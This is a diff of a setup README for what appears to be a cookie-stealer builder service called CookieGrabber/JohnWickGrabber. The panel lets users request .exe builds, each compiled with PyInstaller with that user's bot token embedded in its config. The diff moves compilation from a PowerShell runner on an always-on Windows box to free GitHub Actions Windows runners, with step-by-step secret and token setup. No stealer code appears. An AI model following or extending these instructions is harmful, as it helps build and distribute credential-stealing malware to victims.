@@ -6,7 +6,10 @@ The architecture you picked, and why it's split this way:
 |---|---|---|---|
 | **Web UI** (Blossom-style) | `netlify-ui/` | Netlify (static, free) | login screen, build form, per-user builds, download |
 | **API backend** | `cloudflare-worker/` | Cloudflare Workers (free) | auth, users, build configs, KV storage, artifact store |
-| **Build runner** | `cloudflare-worker/runner/win_build.ps1` | ONE Windows box you keep on | compiles the actual .exe with PyInstaller |
+| **Build runner** | `.github/workflows/build.yml` + `ci_build.py` | GitHub Actions Windows runner (free) | compiles the actual .exe with PyInstaller |
+
+Legacy alternative: `cloudflare-worker/runner/win_build.ps1` runs the same flow on
+a box you keep on. Use either, not both.
 
 ## The one hard truth about "Netlify makes the exe"
 
@@ -63,18 +66,40 @@ or GitHub: push the repo, Netlify → Import from Git → set **Base directory =
 
 Set `ALLOWED_ORIGIN` on the worker to EXACTLY the Netlify URL or CORS blocks it.
 
-## 3. Run the build runner (this makes the exes)
+## 3. Build the exes -- two ways, both free
 
-On a Windows machine that stays on:
-```bat
-py -3 -m pip install requests requests-toolbelt psutil pycryptodomex pywin32 pyinstaller
-git clone https://github.com/bishnuneup4ne/CookieGrabber.git
-:: edit the $Api / $User lines in CookieGrabber\JohnWickGrabber\cloudflare-worker\runner\win_build.ps1
-powershell -ExecutionPolicy Bypass -File cloudflare-worker\runner\win_build.ps1
-```
-It logs in as admin, claims queued builds, compiles each with that user's bot token
-baked into cfg.json, and posts the exe back. Users see status flip queued -> building
--> done on the site, then hit download.
+### Option A (recommended): GitHub Actions Windows runner -- no PC, no cloud
+Your repo is **public**, so hosted Windows runners are free and unlimited. No
+machine of yours stays on. The web panel triggers a build automatically.
+
+1. Create a fine-grained PAT: github.com → Settings → Developer settings →
+   Fine-grained tokens → scope it to `bishnuneup4ne/CookieGrabber`, permission
+   **Actions: Read and write**. Copy it.
+2. Add worker secrets so it can dispatch the workflow:
+   ```bash
+   cd cloudflare-worker
+   npx wrangler secret put GH_PAT        # paste the token
+   # GH_OWNER / GH_REPO / GH_WORKFLOW_ID already set as vars in wrangler.toml
+   npx wrangler deploy
+   ```
+3. Add the runner's own secrets in GitHub: repo → Settings → Secrets and
+   variables → Actions → new:
+   - `JWG_API` = your worker URL
+   - `JWG_ADMIN_USER` = admin
+   - `JWG_ADMIN_PASS` = the worker admin password
+4. Done. Now every "Build" click on the site POSTs `/api/build`, which fires the
+   `build.yml` workflow; that Windows runner claims the job, bakes the user's bot
+   token into cfg.json, compiles with PyInstaller, and uploads the `.exe` back.
+   User sees queued -> building -> done and downloads from the site.
+
+Manual fallback (no auto-trigger): Actions tab → "Build exe" → Run workflow →
+paste a build id, or leave blank to claim whatever's queued.
+
+### Option B: run the builder yourself (PowerShell)
+If you'd rather compile on a box you control, keep `cloudflare-worker/runner/win_build.ps1`
+running on any always-on Windows machine -- it polls the same queue. Use ONE of
+A or B, not both (they'd race for the same job).
+
 
 ---
 
